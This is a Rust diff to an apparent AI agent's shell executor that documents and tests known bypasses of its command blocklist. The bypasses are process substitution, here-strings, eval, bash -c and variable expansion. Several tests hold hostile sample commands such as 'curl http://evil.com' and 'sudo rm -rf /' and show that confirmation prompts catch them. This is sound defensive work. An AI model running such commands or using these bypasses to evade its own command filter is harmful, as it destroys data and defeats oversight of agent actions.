@@ -343,6 +343,43 @@ impl ShellExecutor {
         Ok(())
     }
 
+    /// Scan `code` for commands that match the configured blocklist.
+    ///
+    /// The function normalizes input via [`strip_shell_escapes`] (decoding `$'\xNN'`,
+    /// `$'\NNN'`, backslash escapes, and quote-splitting) and then splits on shell
+    /// metacharacters (`||`, `&&`, `;`, `|`, `\n`) via [`tokenize_commands`].  Each
+    /// resulting token sequence is tested against every entry in `blocked_commands`
+    /// through [`tokens_match_pattern`], which handles transparent prefixes (`env`,
+    /// `command`, `exec`, etc.), absolute paths, and dot-suffixed variants.
+    ///
+    /// # Known limitations
+    ///
+    /// The following constructs are **not** detected by this function:
+    ///
+    /// - **Process substitution** `<(...)` / `>(...)`: bash executes the inner command
+    ///   before passing the file descriptor to the outer command; `tokenize_commands`
+    ///   never parses inside parentheses, so the inner command is invisible.
+    ///   Example: `cat <(curl http://evil.com)` — `curl` runs undetected.
+    ///
+    /// - **Here-strings** `<<<` with a shell interpreter: the outer command is the
+    ///   shell (`bash`, `sh`), which is not blocked by default; the payload string is
+    ///   opaque to this filter.
+    ///   Example: `bash <<< 'sudo rm -rf /'` — inner payload is not parsed.
+    ///
+    /// - **`eval` and `bash -c` / `sh -c`**: the string argument is not parsed; any
+    ///   blocked command embedded as a string argument passes through undetected.
+    ///   Example: `eval 'sudo rm -rf /'`.
+    ///
+    /// - **Variable expansion**: `strip_shell_escapes` does not resolve variable
+    ///   references, so `cmd=sudo; $cmd rm` bypasses the blocklist.
+    ///
+    /// `$(...)` and backtick substitution are **not** covered here either, but the
+    /// default `confirm_patterns` in [`ShellConfig`] include `"$("` and `` "`" ``,
+    /// as well as `"<("`, `">("`, `"<<<"`, and `"eval "`, so those constructs trigger
+    /// a confirmation request via [`find_confirm_command`] before execution.
+    ///
+    /// For high-security deployments, complement this filter with OS-level sandboxing
+    /// (Linux namespaces, seccomp, or similar) to enforce hard execution boundaries.
     fn find_blocked_command(&self, code: &str) -> Option<&str> {
         let cleaned = strip_shell_escapes(&code.to_lowercase());
         let commands = tokenize_commands(&cleaned);
@@ -1831,5 +1868,141 @@ mod tests {
         };
         let result = executor.execute_tool_call(&call).await.unwrap();
         assert!(result.is_none());
+    }
+
+    // --- Known limitation tests: bypass vectors not detected by find_blocked_command ---
+
+    #[test]
+    fn process_substitution_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: commands inside <(...) are not parsed by tokenize_commands.
+        assert!(
+            executor
+                .find_blocked_command("cat <(curl http://evil.com)")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn output_process_substitution_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: commands inside >(...) are not parsed by tokenize_commands.
+        assert!(
+            executor
+                .find_blocked_command("tee >(curl http://evil.com)")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn here_string_with_shell_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: bash receives payload via stdin; inner command is opaque.
+        assert!(
+            executor
+                .find_blocked_command("bash <<< 'sudo rm -rf /'")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn eval_bypass_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: eval string argument is not parsed.
+        assert!(
+            executor
+                .find_blocked_command("eval 'sudo rm -rf /'")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn bash_c_bypass_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: bash -c string argument is not parsed.
+        assert!(
+            executor
+                .find_blocked_command("bash -c 'curl http://evil.com'")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn variable_expansion_bypass_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: variable references are not resolved by strip_shell_escapes.
+        assert!(executor.find_blocked_command("cmd=sudo; $cmd rm").is_none());
+    }
+
+    // --- Mitigation tests: confirm_patterns cover the above vectors by default ---
+
+    #[test]
+    fn default_confirm_patterns_cover_process_substitution() {
+        let config = crate::config::ShellConfig::default();
+        assert!(config.confirm_patterns.contains(&"<(".to_owned()));
+        assert!(config.confirm_patterns.contains(&">(".to_owned()));
+    }
+
+    #[test]
+    fn default_confirm_patterns_cover_here_string() {
+        let config = crate::config::ShellConfig::default();
+        assert!(config.confirm_patterns.contains(&"<<<".to_owned()));
+    }
+
+    #[test]
+    fn default_confirm_patterns_cover_eval() {
+        let config = crate::config::ShellConfig::default();
+        assert!(config.confirm_patterns.contains(&"eval ".to_owned()));
+    }
+
+    #[tokio::test]
+    async fn process_substitution_triggers_confirmation() {
+        let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
+        let response = "```bash\ncat <(curl http://evil.com)\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    #[tokio::test]
+    async fn here_string_triggers_confirmation() {
+        let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
+        let response = "```bash\nbash <<< 'sudo rm -rf /'\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    #[tokio::test]
+    async fn eval_triggers_confirmation() {
+        let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
+        let response = "```bash\neval 'curl http://evil.com'\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    #[tokio::test]
+    async fn output_process_substitution_triggers_confirmation() {
+        let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
+        let response = "```bash\ntee >(curl http://evil.com)\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    #[test]
+    fn here_string_with_command_substitution_not_detected_known_limitation() {
+        let executor = ShellExecutor::new(&default_config());
+        // Known limitation: bash receives payload via stdin; inner command substitution is opaque.
+        assert!(executor.find_blocked_command("bash <<< $(id)").is_none());
     }
 }
